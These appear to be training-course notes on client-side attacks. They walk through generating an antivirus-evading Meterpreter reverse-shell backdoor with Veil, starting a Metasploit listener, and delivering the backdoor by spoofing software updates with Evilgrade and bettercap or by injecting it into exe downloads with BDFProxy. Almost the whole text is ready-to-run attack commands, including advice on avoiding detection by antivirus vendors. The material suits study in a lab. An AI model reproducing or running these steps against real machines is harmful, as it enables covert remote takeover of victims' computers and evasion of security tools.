# Gaining access — client side attack
-   used if server-side attacks are not possible
-   requires user interaction
-   social engineering and information gathering is really helpful here

## Generate payload (in this case backdoor) with Veil framework
-   hard to create not traceable by antivirus program
-   install Veil on Kali with file `install-veil` in folder attachments or use these commands:
```bash
apt update
apt install -y veil
/usr/share/veil/config/setup.sh --force --silent
```
```bash
veil # start veil
```
-   it is important to keep veil up to date, so use the update often
-   2 main tools in Veil:
    1)  Evasion
        -   generates undetectable backdoors
    2)  Ordnance
        -   generates payloads, which are used by Evasion
        -   part of the "evil" code (reverse connection, downloads and executes file in bg, ...)
```bash
use 1 # uses Evasion tool
list # see all the available payloads
```
-   Meterpreter payloads designed by Metasploit. It runs into memory and it allows to migrate between system processes. For example to run from explorer process. So it is hard to detect.
    -   rev tcp/http/https => reverse connection (target connects to attacker), hard to detect in firewall, looks like user connects to website.

```bash
use 15 # use the payload go/meterpreter/rev_https.py, now configure the required options:
set LHOST 192.168.72.129
set LPORT 8080
set PROCESSORS 1 # not needed, uses only one processor
set SLEEP 6 # not needed, waits 6s before running the code
generate # generates the backdoor, will generate exe file, source code and handlers in displayed location
```
-   check detectability by antivirus programs by no distribute currently down, check alternatives like [kleenscan](https://kleenscan.com/index), <strong>just keep in mind that if virustotal will be used, it will share the results with antivirus programs.</strong>

### Prepare to listen for incoming connection from created payload (backdoor)
-   as mentioned the payload is generated by Metasploit, so use the metasploit to track it:
```bash
msfconsole
use exploit/multi/handler # use module which enables to listen to incoming connections
show options
set PAYLOAD windows/meterpreter/reverse_https # set the payload that was sellected before when generating it (in our case use 15 = go/meterpreter/rev_https.py)
set LHOST 192.168.72.129
set LPORT 8080
exploit # now if anybody opens the backdoor, it will come to this pc...
```

### Backdoor delivery method 1 — spoofing sw update
-   one way how to deliver previously crafted payload to the victim machine
-   can be done only as MITM
-   when we (attacker) get a request for update (can be only checking for update), we will catch this packet and reply with our backdoor payload
-   used tool <strong>Evilgrade</strong> (can be installed, current location `/opt/evilgrade/`)

-   first create http payload
```bash
veil
use 1
list
use 14
set LHOST 192.168.72.129
set LPORT 8080
generate # name it backdoor
exit # close veil
```
-   in 1st bash:
```bash
cd /opt/evilgrade
./evilgrade
show modules # show all the available modules that can be hijacked (these are programs like safari, VMware, virtual box etc.)
configure dap # choosing one module
show options # see all options that can be set
set agent /var/www/html/evil_files/backdoor.exe # set payload which we want victim to download (in our case it is the backdoor created previously)
set endsite speedbit.com #set website to display after the update finishes
start
```
-   open 2nd cmd for dns spoofing
```bash
bettercap -iface eth0 -caplet Documents/arp_spoof.cap # run bettercap with spoofing from MITM lecture (file arp_spoof.cap is in the folder attachments) => create MITM
set dns.spoof.all true # dns spoof to give any request to our update as described in MITM
set dns.spoof.domains update.speedbit.com # set our update page which was shown in first bash
dns.spoof on
```
-   open 3rd cmd and start listening incoming connection coming from the backdoor
    -   create reverse http, https doesn't work with https (some bug, might work in future)
```bash
msfconsole
use exploit/multi/handler # use module which enables to listen to incoming connections
set PAYLOAD windows/meterpreter/reverse_http
set LHOST 192.168.72.129
set LPORT 8080
exploit # now if anybody opens the backdoor, it will come to this pc...
```

-   To test it on victim windows machine download and install Download accelerator plus, in top bar click on "Help" and "Update now"
-   After finishing the update, we will have full control over the victim windows machine's cmd

### Backdoor delivery method 2 — backdooring exe downloads
-   backdoor any .exe downloads from victim machine
-   again, need to be MITM
-   tool used is <strong>Backdoor factory proxy</strong> (install location `/opt/BDFProxy`)
    -   bdf_proxy will use payload defined inside configuration file, and it will attach them inside the .exe files. So the programs look normal, but the program includes the payload
    -   modify configuration file `bdf_proxy.cfg`
        -   find definition of these variables and change the initial values:
        1)  proxyMode = transparent
        2)  find section with definitions for operating systems:
            -   change HOST = your.ip.address
-   after previous modification:

-   1st cmd, start bdf_proxy:
```bash
cd /opt/BDFProxy/
./bdf_proxy.py
```

-   2nd cmd, start ARP spoofing with predefined arp_spoof.cap
```bash
bettercap -iface eth0 -caplet Documents/arp_spoof.cap # run bettercap with spoofing from MITM 
```

-   3rd cmd, connect bdf_proxy with incoming data from ARP spoofing using firewall rule (redirect all the incoming data to bdf_proxy) and start listening incoming connection coming from the backdoor using the resource file from bsd_proxy (after running bsd_proxy in 1st bash, it is generated and shown inside the bash)
```bash
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 # set the firewall rule for redirection
# now start the listening:
msfconsole --resource /opt/BDFProxy/bdfproxy_msf_resource.rc # after some session will be opened by backdoor press Enter
sessions -l  # show available sessions
sessions -i 1 # get inside the session no.1
```
- now on victim machine try to download any exe file and run it